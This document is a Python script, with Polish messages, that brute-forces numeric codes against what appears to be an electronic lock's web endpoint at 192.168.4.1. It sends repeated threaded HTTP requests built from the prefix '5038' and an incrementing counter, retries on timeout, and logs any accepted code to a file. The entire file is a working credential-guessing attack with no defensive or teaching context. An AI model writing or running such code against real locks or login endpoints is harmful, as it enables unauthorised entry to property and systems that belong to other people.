import threading
import time
import httpx
from colorama import Fore, Style

# Lock to synchronize access to the thread_num variable
thread_num_lock = threading.Lock()
thread_num = 1

def try_code(kod):
    global thread_num
    with thread_num_lock:
        current_thread_num = thread_num
        thread_num += 1

    while True:
        print(f'{Fore.CYAN}[Thread {current_thread_num}] Próba kodu: {kod}{Style.RESET_ALL}')
        try:
            response = httpx.get(f'http://192.168.4.1/kodzamkato/{kod}')
            break
        except httpx.ConnectTimeout:
            print(f'{Fore.YELLOW}[Thread {current_thread_num}] Zapytanie przekroczyło czas, Ponawianie próby{Style.RESET_ALL}')
    print(f'{Fore.GREEN}[Thread {current_thread_num}] {response.text}{Style.RESET_ALL}')
    if response.text != "NIE TEN KOD":
        with open('successful_codes.txt', 'a') as file:
            file.write(kod + '\n')
        return True
    return False

def number_bruteforce():
    threads = []
    i = 0
    while True:
        kod = f'5038{i}'
        t = threading.Thread(target=try_code, args=(kod,))
        threads.append(t)
        t.start()

        # Limit the number of active threads to a certain number
        max_threads = 2
        if len(threads) >= max_threads:
            for thread in threads:
                thread.join()
            threads = []

        
        i += 1

def main():
    number_bruteforce()

if __name__ == '__main__':
    main()
